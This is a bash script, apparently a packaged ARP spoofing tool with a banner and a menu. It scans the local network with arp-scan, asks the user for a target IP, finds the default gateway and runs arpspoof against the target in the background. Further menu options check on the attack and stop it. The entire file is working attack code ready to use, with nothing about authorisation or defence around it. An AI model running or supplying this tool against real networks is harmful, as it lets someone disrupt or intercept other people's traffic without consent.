#!/bin/bash

# Check if the required tools are available
check_tools() {
    if ! [ -x "$(command -v $1)" ]; then
        echo -e "\033[1;31m Error: $1 is not installed. Please install $1 and try again. \033[0m" >&2
        exit 1
    fi
}

check_tools "dsniff"
check_tools "arp-scan"
check_tools "netdiscover"

# Function to display the banner
show_banner() {
    clear
    echo -e "\033[1;31m                      ______        __   _______                                  "
    echo "                     |   _  \.-----|  |_|   _   .--.--.----.-----.-----."
    echo "                     |.  |   |  -__|   _|.  1   |  |  |   _|  _  |  -__|"
    echo "                     |.  |   |_____|____|.  ____|_____|__| |___  |_____|"
    echo "                     |:  |   |          |:  |              |_____|"
    echo "                     |::.|   |          |::.|"
    echo "                     '--- ---'          '---'  v1.1  "
    echo -e "\033[1;95m                                                        -by Arbolencio"
    echo -e "\033[1;32m "
    echo -e "\033[1;32m "
    cat dibujo.txt
    echo -e " \033[0m"
}

# Function to display the menu
show_menu() {
    echo -e "\n\033[1;33mMenu:\033[0m"
    echo -e "\033[1;32m 1. Scan network and perform ARP attack\033[0m"
    echo -e "\033[1;32m 2. ARP attack status\033[0m"
    echo -e "\033[1;32m 3. Stop ARP attack\033[0m"
    echo -e "\033[1;32m 4. Exit\033[0m"
}

# Function to scan the network and perform ARP attack
scan_and_attack() {
    echo -e "\033[0;33m"
    read -p "Show interface IP: " red
    echo -e "\033[1;31mScanning network for active hosts...\033[0m"
    ips=$(arp-scan -I "$red" --localnet | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')

    # Display the found IP addresses
    echo -e "\033[1;33mActive hosts on the network:\033[0m"
    echo -e "\033[1;37m $ips"

    # Read the target IP address
    echo -e "\033[1;36m "
    read -p "Enter the target's IP: " ip

    # Calculate the gateway address
    gateway=$(ip route | grep default | awk '{print $3}')

    # ARP attack
    echo "Performing ARP spoofing attack against $ip in background..."
    arpspoof -i "$red" -t "$ip" "$gateway" > /dev/null 2>&1 &

    # Clean up and exit the script
    echo -e "\033[0m"
}

# Function to check ARP attack status
check_attack_status() {
    if pgrep -f "arpspoof" > /dev/null; then
        echo -e "\033[1;32mARP attack is running.\033[0m"
    else
        echo -e "\033[1;31mARP attack is not running.\033[0m"
    fi
}

# Function to stop ARP attack
stop_attack() {
    pkill arpspoof
    echo -e "\033[1;31mARP attack stopped successfully.\033[0m"
}

# Main program
while true; do
    show_banner
    show_menu
    echo -e "\033[35m"
    read -p "Enter your choice: " option
    case $option in
        1) scan_and_attack ;;
        2) check_attack_status ;;
        3) stop_attack ;;
        4) echo -e "\033[36mbay bay!\033[0m"; exit ;;
        *) echo -e "\033[1;31mInvalid option. Please try again.\033[0m" ;;
    esac
    read -p "Press Enter to continue..." # Pause until user presses Enter
    done
